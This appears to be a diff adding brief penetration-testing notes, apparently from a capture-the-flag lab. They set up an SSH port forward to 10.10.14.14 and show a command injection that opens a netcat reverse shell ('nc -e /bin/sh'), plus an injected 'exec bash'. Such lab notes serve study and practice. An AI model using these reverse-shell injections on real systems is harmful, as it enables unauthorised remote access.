@@ -1,0 +1,10 @@
+
+# localhost:1234 -> my host 1234
+ssh -v -N -L 1234:10.10.14.14:1234 root@10.10.14.14
+
+# then we can inject a filtered command
+ exec nc -e /bin/sh localhost 1234
+
+
+# but we can inject just bash :)
+exec bash
